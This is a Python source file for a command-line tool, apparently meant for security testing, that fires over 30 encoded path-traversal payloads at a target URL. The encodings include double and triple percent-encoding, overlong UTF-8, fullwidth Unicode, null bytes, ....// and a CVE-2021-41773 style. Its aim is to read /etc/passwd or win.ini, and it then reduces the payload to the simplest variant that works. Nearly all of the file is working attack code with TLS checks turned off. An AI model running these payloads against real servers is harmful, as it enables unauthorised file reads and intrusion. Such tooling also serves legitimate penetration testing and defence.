#!/usr/bin/env python3
"""
path-traversal - Automated path traversal testing tool with encoding techniques.

Tests 20+ encoding variations of directory traversal payloads against a target URL
to identify potentially vulnerable file read endpoints.

Usage:
    path-traversal -u http://example.com/file?file=
    path-traversal -u http://example.com/file?file=var/www/
    path-traversal -u http://example.com/file?file=var/www -p windows
    path-traversal -u http://example.com/file?file= -d 10
    path-traversal -u http://example.com/file?file= -t 5 -o
"""

import argparse
import sys
import urllib.parse
import urllib.request
import urllib.error
import ssl
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional

# ── Colors ──────────────────────────────────────────────────────────────────
GREEN  = '\033[92m'
RED    = '\033[91m'
YELLOW = '\033[93m'
CYAN   = '\033[96m'
GRAY   = '\033[90m'
BOLD   = '\033[1m'
RESET  = '\033[0m'
CLEAR  = '\033[2K'

VERSION = "1.7.0"

# ── Payload Builder ─────────────────────────────────────────────────────────

def build_encodings(base_path: str, depth: int, platform: str) -> list[dict]:
    """
    Build all encoding variations of the traversal payload.
    Returns list of {name, payload, note} dicts.
    payload is the raw string to place in the URL (pre-URL-encoded as needed).
    """
    if platform == "windows":
        target  = "windows\\win.ini"
        sep     = "..\\"
    else:
        target  = "etc/passwd"
        sep     = "../"

    raw_trav = sep * depth + target

    # Normalise base path
    bp = base_path
    if bp:
        bp = bp.rstrip('/\\') + '/'

    encodings = []

    def add(name: str, payload: str, note: str):
        encodings.append(dict(name=name, payload=payload, note=note))

    # ── 1. Raw ───────────────────────────────────────────────────────────────
    add("raw", bp + raw_trav, "Raw ../ traversal, no obfuscation")

    # ── 2. Single percent-encode (every char) ────────────────────────────────
    raw_enc = "".join(f"%{ord(c):02x}" for c in raw_trav)
    add("percent-full", bp + raw_enc, "Every char percent-encoded (%2e%2e%2f...)")

    # ── 3. Double percent-encode ─────────────────────────────────────────────
    add("percent-double", bp + "".join(f"%25{ord(c):02x}" for c in raw_trav),
        "Double percent-encode (%252e%252e%252f...)")

    # ── 4. Triple percent-encode ─────────────────────────────────────────────
    add("percent-triple", bp + "".join(f"%2525{ord(c):02x}" for c in raw_trav),
        "Triple percent-encode (%25252e%25252e%25252f...)")

    # ── 5. Slash-only encode ─────────────────────────────────────────────────
    add("slash-encode", bp + raw_trav.replace("/", "%2f"),
        "Only slashes encoded (..%2f..%2f...)")

    # ── 6. Dot-only encode ───────────────────────────────────────────────────
    add("dot-encode", bp + re.sub(r'\.', '%2e', raw_trav),
        "Only dots encoded (%2e%2e/%2e%2e/...)")

    # ── 7. Encoded dot + backslash (Windows) ─────────────────────────────────
    if platform == "windows":
        bs_trav = "..\\" * depth + target.replace("/", "\\")
        add("backslash", bp + bs_trav, "Windows backslash (..\\..\\...)")
        ebs_trav = "%2e%2e\\" * depth + "windows\\win.ini"
        add("edot-bslash", bp + ebs_trav, "Encoded dot + backslash (%2e%2e\\)")
        enc_bs = "%2e%2e%5c" * depth + "windows%5cwin.ini"
        add("enc-bslash", bp + enc_bs, "Encoded backslash (%2e%2e%5c...)")

    # ── 8. Overlong UTF-8 (IIS Unicode) ──────────────────────────────────────
    # %c0%ae = overlong '.', %c0%af = overlong '/'
    uni_trav = "%c0%ae%c0%ae%c0%af" * depth + "etc%c0%afpasswd"
    add("unicode-overlong", bp + uni_trav,
        "Overlong UTF-8 (IIS, %c0%ae%c0%ae%c0%af)")

    # ── 9. Fullwidth Unicode ─────────────────────────────────────────────────
    # U+FF0E = ．, U+FF0F = ／
    fw = "．．／" * depth + "etc／passwd"
    add("fullwidth", bp + fw, "Fullwidth Unicode (．．／...)")

    # ── 10. Null byte suffix ──────────────────────────────────────────────────
    add("null-byte", bp + raw_trav + "%00", "Null byte truncation (%00 ...)")

    # ── 11. Trailing space ────────────────────────────────────────────────────
    add("trailing-space", bp + raw_trav + "%20", "Trailing space (%20)")

    # ── 12. Triple dot ────────────────────────────────────────────────────────
    add("triple-dot", bp + ".../" * depth + target,
        "Triple dots (.../.../.../)")

    # ── 12b. Quad-dot double-slash (....//) ────────────────────────────────────
    add("quad-dot", bp + "....//" * depth + target,
        "Quad-dot double-slash (....//....//) — bypasses simple ../ filters")

    # ── 13. Semicolon path param ──────────────────────────────────────────────
    add("semicolon", bp + "..;/" * depth + target,
        "Semicolon path param (..;/..;/)")

    # ── 14. Uppercase percent-hex ─────────────────────────────────────────────
    # Build raw with uppercase hex for slashes
    upper = raw_trav.replace("/", "%2F")
    add("upper-hex", bp + upper, "Uppercase percent-hex (%2F instead of %2f)")

    # ── 15. Mixed-case percent-hex ────────────────────────────────────────────
    mixed = ""
    for i, c in enumerate(raw_trav):
        if c in './':
            mixed += f"%{ord(c):02X}" if i % 2 == 0 else f"%{ord(c):02x}"
        else:
            mixed += c
    add("mixed-hex", bp + mixed, "Mixed case percent-hex (%2e vs %2E)")

    # ── 16. Tab separator ─────────────────────────────────────────────────────
    add("tab-sep", bp + "..%09" * depth + target,
        "Tab character separator (..%09..%09...)")

    # ── 17. Plus sign variant ─────────────────────────────────────────────────
    add("plus-sign", bp + "..+/" * depth + target,
        "Plus sign variant (..+/..+/)")

    # ── 18. Alternating encoded/literal ───────────────────────────────────────
    alt = "".join("..%2f" if i % 2 == 0 else "../" for i in range(depth)) + target
    add("alternating", bp + alt, "Alternating encoded/literal (%2f vs /)")

    # ── 19. Dot with trailing slash mixed ────────────────────────────────────
    mix = "".join("%2e%2e/" if i % 3 == 0 else "../" for i in range(depth)) + target
    add("mixed-dot-enc", bp + mix, "Mixed encoded/literal dots")

    # ── 20. /proc/self symlink escape ────────────────────────────────────────
    if not bp and platform != "windows":
        add("proc-self", "/proc/self/root/.." * 5 + "/etc/passwd",
            "/proc/self/root symlink escape")

    # ── 21. Drive-relative (Windows) ─────────────────────────────────────────
    if platform == "windows":
        add("drive-rel", bp + "C:" + "..\\" * depth + "windows\\win.ini",
            "Drive-relative (C:..\\..\\)")

    # ── 22. Double-encode with uppercase hex ──────────────────────────────────
    dbl_upp = "".join(f"%25{ord(c):02X}" for c in raw_trav)
    add("dbl-upper", bp + dbl_upp, "Double-encode uppercase hex")

    # ── 23. Space/plus decode mismatch ────────────────────────────────────────
    add("space-plus", bp + raw_trav.replace("../", "..+/"),
        "Space/plus decode mismatch (..+/), form-encoding style")

    # ── 24. Mixed dot + slash encode ─────────────────────────────────────────
    # Encode some pairs fully, some partially
    ms = "".join(
        "%2e%2e%2f" if i % 4 == 0
        else "..%2f" if i % 4 == 1
        else "%2e%2e/" if i % 4 == 2
        else "../"
        for i in range(depth)
    ) + target
    add("mixed-all", bp + ms, "Mixed encoding styles round-robin")

    # ── 25. Raw with plus instead of slash ────────────────────────────────────
    # This is form-encoded style where space = +
    plus_trav = "../" * depth + target.replace("/", "+")
    add("plus-slash", bp + plus_trav,
        "Plus as slash (form-encoding style, + = /)")

    # ── 26. Double URL encode (alternate style) ──────────────────────────────
    # %25 then the hex
    alt2 = "".join(f"%25{ord(c):02x}" for c in raw_trav)
    add("dbl-alt", bp + alt2, "Double-encode alternate style")

    # ── 27. Mixed: raw then encoded (split at midpoint) ──────────────────────
    mid = depth // 2
    mixed_raw = "../" * mid + "..%2f" * (depth - mid) + target
    add("split-encode", bp + mixed_raw, "Raw then encoded at midpoint")

    # ── 28. rfc 2231/5987 filename* style ────────────────────────────────────
    # This is for multipart uploads, not typical URL testing, but include
    add("rfc5987", bp + "UTF-8''" + raw_trav,
        "RFC 5987 filename* style (UTF-8''..%2f..%2f)")

    # ── 29. .NET PhysicalFileProvider bypass ──────────────────────────────────
    # Using ..%2f with / at the end
    net = "..%2f" * depth + target
    add("dotnet-style", bp + net, ".NET-style encoded separators")

    # ── 30. Nginx alias traversal ────────────────────────────────────────────
    add("nginx-alias", bp + "..%2f" * depth + target,
        "Nginx alias missing-slash bypass")

    # ── 31. Apache mod_alias style ────────────────────────────────────────────
    add("apache-mod", bp + ".%2e/" * depth + target,
        "Apache mod_alias .%2e/ style (CVE-2021-41773)")

    return encodings


def minimize_payload(base_url: str, base_path: str, depth: int, platform: str,
                     timeout: int, live: bool):
    """
    When a fully-encoded payload hits 200, try progressively simpler encodings
    (raw -> slash-only -> dot-only -> single-sep -> double-sep -> ...) and return
    the most minimal payload that still returns 200.

    Returns dict: {name, url, resp} or None if nothing simpler works.
    """
    target = "etc/passwd" if platform == "unix" else "windows\\win.ini"
    sep = "../" if platform == "unix" else "..\\"
    raw_trav = sep * depth + target

    bp = base_path
    if bp:
        bp = bp.rstrip('/\\') + '/'

    # Ladder from simplest to most encoded — first 200 is the minimal working form.
    # Order matters: try the least-encoded variants first so we stop at the minimal one.
    ladder = [
        ("raw",          bp + raw_trav),
        ("slash-encode", bp + raw_trav.replace("/", "%2f")),           # ..%2f..%2f..%2fetc%2fpasswd
        ("slash-double", bp + raw_trav.replace("/", "%252f")),         # ..%252f..%252f..%252fetc%252fpasswd
        ("dot-encode",   bp + re.sub(r'\.', '%2e', raw_trav)),         # %2e%2e/%2e%2e/.../etc/passwd
        ("dot-double",   bp + re.sub(r'\.', '%252e', raw_trav)),       # %252e%252e/.../etc/passwd
        ("single-sep",   bp + "".join(f"%{ord(c):02x}" if c in './' else c for c in raw_trav)),
        ("double-sep",   bp + "".join(f"%25{ord(c):02x}" if c in './' else c for c in raw_trav)),
        ("double-full",  bp + "".join(f"%25{ord(c):02x}" for c in raw_trav)),
        ("triple-full",  bp + "".join(f"%2525{ord(c):02x}" for c in raw_trav)),
    ]

    print(f"\n  {'─' * 60}")
    print(f"  Minimizing… trying simpler encodings (first 200 = minimal):")

    total_ladder = len(ladder)
    for i, (name, payload) in enumerate(ladder, 1):
        url = build_url(base_url, payload)
        resp = make_request(url, timeout)
        status_str = status_badge(resp["status"])
        len_str = f"{GRAY}{resp['length']}{RESET}" if resp["length"] == 0 else f"{resp['length']}"
        flag = f" {GREEN}hit{RESET}" if resp["status"] == 200 else ""
        print(f"\n  [{i:>2}/{total_ladder}] {name:<22} {status_str:>6} {len_str:>7}  {flag}")
        print(f"          {GRAY}{url}{RESET}")
        if resp["status"] == 200:
            return {"name": name, "url": url, "resp": resp}

    print()
    return None


# ── HTTP Request ─────────────────────────────────────────────────────────────

def make_request(url: str, timeout: int = 10) -> dict:
    """Make an HTTP request and return status + metadata."""
    result = {
        "status": 0,
        "length": 0,
        "error": None,
        "redirect": None,
    }
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (SecurityResearch; path-traversal v{})".format(VERSION),
            "Accept": "*/*",
        })

        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            result["status"] = resp.status
            body = resp.read()
            result["length"] = len(body)
            result["redirect"] = resp.geturl() if resp.geturl() != url else None

    except urllib.error.HTTPError as e:
        result["status"] = e.code
        result["length"] = len(e.read()) if hasattr(e, 'read') else 0
        result["redirect"] = e.geturl() if e.geturl() and e.geturl() != url else None
    except urllib.error.URLError as e:
        result["error"] = str(e.reason)
    except Exception as e:
        result["error"] = str(e)

    return result


def build_url(base_url: str, payload: str) -> str:
    """
    Construct the full URL. Payload is appended to the end of the URL.
    The payload may contain percent-encoded characters — we must NOT re-encode them.
    But Unicode characters (fullwidth, etc.) must be percent-encoded for the HTTP library.
    """
    # Encode only non-ASCII chars while preserving existing percent-encoded sequences
    encoded = urllib.parse.quote(payload, safe='/%')
    return base_url + encoded


# ── Output ───────────────────────────────────────────────────────────────────

def status_color(status: int) -> str:
    if 200 <= status < 300:
        return GREEN
    elif 300 <= status < 400:
        return YELLOW
    elif status == 401 or status == 403:
        return RED
    elif status == 404:
        return GRAY
    else:
        return RED

def status_badge(status: int) -> str:
    """Return a short colored status string."""
    c = status_color(status)
    if status == 0:
        return f"{RED}ERR{RESET}"
    return f"{c}{status}{RESET}"

def interesting(status: int, length: int, error: Optional[str]) -> bool:
    """Is this response interesting (non-404, non-error)?"""
    if error:
        return False
    if status == 404:
        return False
    if status == 403:
        return False
    if 200 <= status < 300:
        return True
    if 300 <= status < 400:
        return True
    return status == 401 or status == 500


def log_line(idx: int, total: int, enc: dict, resp: dict) -> None:
    """Print a single live log line for one completed request."""
    status = resp["status"]
    length = resp["length"]
    error = resp["error"]
    redirect = resp["redirect"]

    is_int = interesting(status, length, error)
    status_str = status_badge(status)
    len_str = f"{GRAY}{length}{RESET}" if length == 0 else f"{length}"
    redirect_str = f" → {redirect}" if redirect else ""
    flag = f" {GREEN}hit{RESET}" if is_int else ""
    err_str = f" {RED}[{error}]{RESET}" if error else ""
    url = enc.get("url", "")

    print(f"  [{idx:>3}/{total}] {enc['name']:<22} {status_str:>6} {len_str:>7}  "
          f"{GRAY}{enc['note']}{RESET}{redirect_str}{err_str}{flag}")
    print(f"          {GRAY}{url}{RESET}")


def print_summary(results: list, start_time: float) -> int:
    """Print the final result — only the minimal working URL if one was found."""
    # Find the 200 hit (first interesting 2xx in the results)
    hit = next((enc for enc, resp in results if resp["status"] == 200), None)
    if hit and hit.get("url"):
        print()
        print(f"  {'─' * 60}")
        print("  -> minimal format found:")
        print(f"  {GREEN}{BOLD}{hit['url']}{RESET}")
        print()
        return 1
    print()
    print("  No 200 response found.")
    print()
    return 0


# ── CLI ──────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="Path traversal testing tool with encoding techniques",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  path-traversal -u http://example.com/file?file=
  path-traversal -u http://example.com/file?file=var/www/
  path-traversal -u http://example.com/file?file=var/www -p windows
  path-traversal -u http://example.com/file?file= -d 10
  path-traversal -u http://example.com/file?file= -t 5 -o
        """
    )
    parser.add_argument("-u", "--url", required=True,
                        help="Target URL (payload is appended to the end)")
    parser.add_argument("-p", "--platform", choices=["unix", "windows"],
                        default="unix", help="Target platform (default: unix)")
    parser.add_argument("-d", "--depth", type=int, default=10,
                        help="Directory traversal depth (default: 10)")
    parser.add_argument("-t", "--threads", type=int, default=1,
                        help="Concurrent threads (default: 1)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds (default: 10)")
    parser.add_argument("-o", "--only-interesting", action="store_true",
                        help="Only show interesting (non-404) responses")
    parser.add_argument("--no-live", action="store_true",
                        help="Disable live logs (wait, then print full table)")
    parser.add_argument("--no-color", action="store_true",
                        help="Disable colored output")
    return parser.parse_args()


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    args = parse_args()

    if args.no_color:
        globals()["GREEN"] = globals()["RED"] = globals()["YELLOW"] = ""
        globals()["CYAN"] = globals()["GRAY"] = globals()["BOLD"] = ""
        globals()["RESET"] = ""

    base_url = args.url.rstrip("&?")
    depth = args.depth
    platform = args.platform

    # Determine base path from URL (everything after last '=' is the base path)
    base_path = ""
    if "=" in base_url:
        base_path = base_url.split("=", 1)[1]
        base_url = base_url.split("=", 1)[0] + "="

    encodings = build_encodings(base_path, depth, platform)

    # Attach the full URL to each encoding so we can display it later
    for enc in encodings:
        enc["url"] = build_url(base_url, enc["payload"])

    # ── Header ───────────────────────────────────────────────────────────────
    print(f"\n  {BOLD}path-traversal v{VERSION}{RESET}")
    print(f"  {'─' * 60}")
    print(f"  {CYAN}Target:{RESET}   {BOLD}{base_url}{RESET}<payload>")
    print(f"  {CYAN}File:{RESET}    {GREEN}{BOLD}/etc/passwd{RESET}{' (unix)' if platform == 'unix' else ' (windows)'}")
    print(f"  {CYAN}Depth:{RESET}   {BOLD}{depth}{RESET} directories")
    print(f"  {CYAN}Tests:{RESET}   {BOLD}{len(encodings)}{RESET} encoding variations")
    print(f"  {'─' * 60}\n")

    # ── Results ──────────────────────────────────────────────────────────────
    results = []
    start_time = time.time()
    total = len(encodings)
    live = not args.no_live
    found_200 = False
    hit_enc = None   # the encoding that first returned 200

    if args.threads > 1:
        # Parallel execution — submit in batches so we can stop early on 200
        batch_size = args.threads
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            for chunk_start in range(0, total, batch_size):
                if found_200:
                    break

                chunk = encodings[chunk_start:chunk_start + batch_size]
                futures = {}
                for enc in chunk:
                    url = build_url(base_url, enc["payload"])
                    future = executor.submit(make_request, url, args.timeout)
                    futures[future] = enc

                for future in as_completed(futures):
                    enc = futures[future]
                    try:
                        resp = future.result()
                    except Exception as e:
                        resp = {"status": 0, "length": 0, "error": str(e), "redirect": None}
                    results.append((enc, resp))
                    if live:
                        log_line(len(results), total, enc, resp)

                    if resp["status"] == 200 and not found_200:
                        found_200 = True
                        hit_enc = enc
                        if live:
                            print(f"  {'─' * 60}\n  200 found — stopping.")
                        break  # stop draining this chunk

                if found_200:
                    break
    else:
        # Sequential execution — stop on first 200
        for i, enc in enumerate(encodings):
            if found_200:
                break
            url = build_url(base_url, enc["payload"])
            resp = make_request(url, args.timeout)
            results.append((enc, resp))
            if live:
                log_line(i + 1, total, enc, resp)
            if resp["status"] == 200:
                found_200 = True
                hit_enc = enc
                if live:
                    print(f"  {'─' * 60}\n  200 found — stopping.")
                break

    # If the working hit was an encoded payload, try to minimize it
    if found_200 and hit_enc and ("%2" in hit_enc["payload"] or "%25" in hit_enc["payload"]):
        minimized = minimize_payload(base_url, base_path, depth, platform,
                                     args.timeout, live)
        if minimized:
            hit_enc["url"] = minimized["url"]
            hit_enc["name"] = f"{minimized['name']} (minimal)"

    # Keep results in the order they were collected (do not re-sort when stopped early)
    if args.threads > 1 and not found_200:
        order = {e["name"]: i for i, e in enumerate(encodings)}
        results.sort(key=lambda x: order.get(x[0]["name"], 999))

    if not live:
        # ── Full table (legacy, non-live view) ──────────────────────────────
        print(f"  {'#':>3}  {'Technique':<22}  {'Status':<7}  {'Len':<8}  {'Note'}")
        print(f"  {'─'*3}  {'─'*22}  {'─'*7}  {'─'*8}  {'─'*30}")
        for idx, (enc, resp) in enumerate(results, 1):
            status = resp["status"]
            length = resp["length"]
            error = resp["error"]
            redirect = resp["redirect"]

            is_int = interesting(status, length, error)
            if args.only_interesting and not is_int:
                continue

            status_str = status_badge(status)
            len_str = f"{GRAY}{length}{RESET}" if length == 0 else f"{length}"
            redirect_str = f" → {redirect}" if redirect else ""
            flag = f" {GREEN}hit{RESET}" if is_int else ""
            err_str = f" {RED}[{error}]{RESET}" if error else ""

            print(f"  {idx:>3}  {enc['name']:<22}  {status_str:>7}  {len_str:<8}  "
                  f"{GRAY}{enc['note']}{RESET}{redirect_str}{err_str}{flag}")
            if is_int and enc.get("url"):
                print(f"          {GRAY}{enc['url']}{RESET}")

    # ── Summary ──────────────────────────────────────────────────────────────
    print_summary(results, start_time)
    print()


if __name__ == "__main__":
    main()